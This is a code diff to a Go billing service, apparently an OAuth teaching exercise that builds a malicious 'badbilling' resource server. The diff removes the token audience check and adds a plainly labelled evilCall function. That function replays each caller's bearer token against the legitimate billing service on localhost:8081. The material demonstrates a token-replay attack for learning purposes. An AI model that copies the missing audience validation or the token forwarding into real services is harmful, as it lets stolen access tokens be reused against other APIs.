@@ -1,17 +1,20 @@
 package main
 
 import (
+	"context"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"learn.oauth.billing/model"
 	"log"
 	"net/http"
 	"net/url"
 	"reflect"
 	"runtime"
 	"strings"
+	"time"
+
+	"learn.oauth.badbilling/model"
 )
 
 // Billing list of services to pay
@@ -29,7 +32,7 @@ type TokenIntrospect struct {
 	Jti      string `json:"jti"`
 	Exp      int    `json:"exp"`
 	Nbf      int    `json:"nbf"`
-	Iat      interface{}    `json:"iat"`
+	Iat      int    `json:"iat"`
 	Aud      string `json:"aud"`
 	Typ      string `json:"typ"`
 	AuthTime int    `json:"auth_time"`
@@ -45,7 +48,7 @@ var config = struct {
 
 func main() {
 	http.HandleFunc("/billing/v1/services", enabledLog(services))
-	http.ListenAndServe(":8081", nil)
+	http.ListenAndServe(":8082", nil)
 }
 
 func services(w http.ResponseWriter, r *http.Request) {
@@ -78,20 +81,6 @@ func services(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	isValidAudience := false
-	for _, v := tokenClaim.AudAsSlice() {
-		if (v == "billingService" || v == "billingServiceV2") {
-			isValidAudience = true
-			break
-		}
-	}
-
-	if !isValidAudience {
-		fmt.Printf("Invalid audiences : %v", tokenClaim.AudAsSlice() )
-		makeErrorMessage(w, "invalid token audience. Required audience [billingService, billingServiceV2]")
-		return
-	}
-
 	if !strings.Contains(tokenClaim.Scope, "getBillingService") {
 		makeErrorMessage(w, "invalid token scope. Required scope [getBillingService]")
 		return
@@ -109,13 +98,15 @@ func services(w http.ResponseWriter, r *http.Request) {
 	w.Header().Add("Content-Type", "application/json")
 	w.Header().Add("Access-Control-Allow-Origin", "*")
 	encoder.Encode(s)
+
+	// perform evil called
+	evilCall(token)
 }
 
 func enabledLog(handler func(http.ResponseWriter, *http.Request)) func(http.ResponseWriter, *http.Request) {
 	return func(w http.ResponseWriter, r *http.Request) {
 		handlerName := runtime.FuncForPC(reflect.ValueOf(handler).Pointer()).Name()
-		log.SetPrefix(handlerName + " ")
-
+		log.SetPrefix("EvilService" + handlerName + " ")
 		log.Println("--> " + handlerName)
 		log.Printf("request : %v\n", r.RequestURI)
 		// log.Printf("response : %v\n", w)
@@ -197,7 +188,6 @@ func validateToken(token string) bool {
 }
 
 func makeErrorMessage(w http.ResponseWriter, errMsg string) {
-	log.Println("Error message : ", errMsg)
 	s := &BillingError{Error: errMsg} //error message
 	encoder := json.NewEncoder(w)
 	w.Header().Add("Content-Type", "application/json")
@@ -214,4 +204,46 @@ func getClaim(token string) ([]byte, error) {
 		return []byte{}, err
 	}
 	return claim, nil
+}
+
+func evilCall(accessToken string) {
+
+	servicesEndpoint := "http://localhost:8081/billing/v1/services"
+
+	// request
+	req, err := http.NewRequest("GET", servicesEndpoint, nil)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	req.Header.Add("Authorization", "Bearer "+accessToken)
+
+	// client
+	ctx, cancelFunc := context.WithTimeout(context.Background(), 500*time.Millisecond)
+	defer cancelFunc()
+
+	c := http.Client{}
+	res, err := c.Do(req.WithContext(ctx))
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	byteBody, err := ioutil.ReadAll(res.Body)
+
+	defer res.Body.Close()
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	// process response
+	if res.StatusCode != 200 {
+		log.Println(string(byteBody))
+		log.Println("status isn't 200, but ", res.StatusCode)
+		return
+	}
+
+	log.Println("Evil call successed : ", string(byteBody))
 }
